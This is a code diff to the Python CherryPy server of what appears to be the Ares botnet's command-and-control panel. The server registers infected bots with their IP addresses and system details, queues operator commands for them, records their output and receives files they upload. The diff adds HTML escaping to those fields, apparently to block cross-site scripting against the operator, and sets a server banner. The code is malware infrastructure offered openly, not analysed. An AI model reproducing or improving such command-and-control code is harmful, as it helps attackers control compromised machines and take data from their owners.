@@ -13,6 +13,19 @@ if not os.path.exists(UPLOAD_DIR):
 pending_uploads = []
 
 
+html_escape_table = {
+    "&": "&amp;",
+    '"': "&quot;",
+    "'": "&apos;",
+    ">": "&gt;",
+    "<": "&lt;",
+}
+
+
+def html_escape(text):
+    return "".join(html_escape_table.get(c,c) for c in text)
+
+
 def validate_botid(candidate):
     return re.match('^[a-zA-Z0-9\s\-_]+$', candidate) is not None
 
@@ -73,7 +86,7 @@ class API(object):
             raise cherrypy.HTTPError(403)
         bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
         if not bot:
-            exec_DB("INSERT INTO bots VALUES (?, ?, ?, ?)", (botid, time.time(), cherrypy.request.headers["X-Forwarded-For"] if "X-Forwarded-For" in cherrypy.request.headers else cherrypy.request.remote.ip, sysinfo))
+            exec_DB("INSERT INTO bots VALUES (?, ?, ?, ?)", (html_escape(botid), time.time(), html_escape(cherrypy.request.headers["X-Forwarded-For"]) if "X-Forwarded-For" in cherrypy.request.headers else cherrypy.request.remote.ip, html_escape(sysinfo)))
         else:
             exec_DB("UPDATE bots SET lastonline=? where name=?", (time.time(), botid))
         cmd = query_DB("SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date", (botid, 0))
@@ -87,13 +100,13 @@ class API(object):
     def report(self, botid, output):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
-        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), output, botid))
+        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), html_escape(output), html_escape(botid)))
 
     @cherrypy.expose
     def push(self, botid, cmd):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
-        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, botid))
+        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), html_escape(cmd), False, html_escape(botid)))
         if cmd.startswith("upload "):
             pending_uploads.append(cmd[len("upload "):])
 
@@ -134,7 +147,7 @@ class API(object):
                 break
             outfile.write(data)
         outfile.close()
-        up_url = "../uploads/" +  botid + "/" + src
+        up_url = "../uploads/" +  html_escape(botid) + "/" + html_escape(src)
         return 'Uploaded: <a href="' + up_url + '">' + up_url + '</a>'
 
 
@@ -142,6 +155,9 @@ def main():
     config = {'global': {'server.socket_host': '127.0.0.1',
                 'server.socket_port': 8080,
                 'environment': 'production',
+                },
+                '/': {  
+                    'response.headers.server' : "Ares",
                 },
                 '/static': {
                     'tools.staticdir.on': True,
@@ -155,6 +171,7 @@ def main():
     app = Main()
     app.api = API()
     app.cnc = CNC()
+    print "[*] Server started on %s:%s" % (config["global"]["server.socket_host"], config["global"]["server.socket_port"])
     cherrypy.quickstart(app, config=config)
 
 
